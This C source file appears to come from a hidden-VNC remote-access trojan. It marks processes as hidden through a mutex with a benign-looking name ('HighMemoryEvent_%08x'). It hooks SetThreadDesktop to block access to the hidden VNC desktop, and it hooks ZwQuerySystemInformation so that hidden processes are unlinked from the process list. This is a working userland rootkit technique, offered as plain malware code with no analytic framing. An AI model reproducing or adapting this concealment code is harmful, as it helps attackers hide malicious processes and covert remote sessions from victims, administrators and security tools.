#include "injlib.h"
#include "hidevncprocwnd.h"

bool IsVNC(HANDLE hDesk,DWORD *lpHash);

static TCHAR szHiddenProcessMutexNameFormat[]=_T("HighMemoryEvent_%08x");

#ifndef _INJLIB
static
#endif
HANDLE RegisterHiddenProcess()
{
	TCHAR szMutexName[MAX_PATH];
    wsprintf(szMutexName,szHiddenProcessMutexNameFormat,GetCurrentProcessId());
    return CreateMutex(NULL,FALSE,szMutexName);
}

#ifdef _INJLIB
bool IsProcessHidden(HANDLE dwProcessId)
{
	bool bResult=false;
	TCHAR szMutexName[MAX_PATH];

    wsprintf(szMutexName,szHiddenProcessMutexNameFormat,dwProcessId);

    HANDLE hMutex;
    if ((hMutex=OpenMutex(SYNCHRONIZE,false,szMutexName)) > 0)
    {
        bResult=true;
        SysCloseHandle(hMutex);
    }

	return bResult;
}

DEF_HOOK(SetThreadDesktop);
BOOL WINAPI SetThreadDesktop_handler(HDESK hDesk)
{
    if (hDesk)
	{
	    if (IsVNC((HANDLE)hDesk,NULL))
            return FALSE;
	}
    REAL_API(SetThreadDesktop)
        return FALSE;
	return lpSetThreadDesktop(hDesk);
}

DEF_HOOK(ZwQuerySystemInformation);
NTSTATUS NTAPI ZwQuerySystemInformation_handler(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength)
{
    NTSTATUS Status;
    REAL_API(ZwQuerySystemInformation)
        return NULL;
    do
    {
        Status=lpZwQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
        if (!NT_SUCCESS(Status))
            break;

        if (SystemInformationClass != SystemProcessesAndThreadsInformation)
            break;

        PSYSTEM_PROCESSES pCurProcInfo = (PSYSTEM_PROCESSES)SystemInformation;
        if (!pCurProcInfo)
            break;

        while (pCurProcInfo->NextEntryOffset)
        {
            PSYSTEM_PROCESSES pNextProcInfo=(PSYSTEM_PROCESSES)((PUCHAR)pCurProcInfo+pCurProcInfo->NextEntryOffset);

            if (IsProcessHidden(pNextProcInfo->UniqueProcessId))
            {
                if (pNextProcInfo->NextEntryOffset)
                    pCurProcInfo->NextEntryOffset+=pNextProcInfo->NextEntryOffset;
                else
                    pCurProcInfo->NextEntryOffset=0;
            }
            else
                pCurProcInfo=pNextProcInfo;
        }
    }
    while (false);

    return Status;
}
#endif

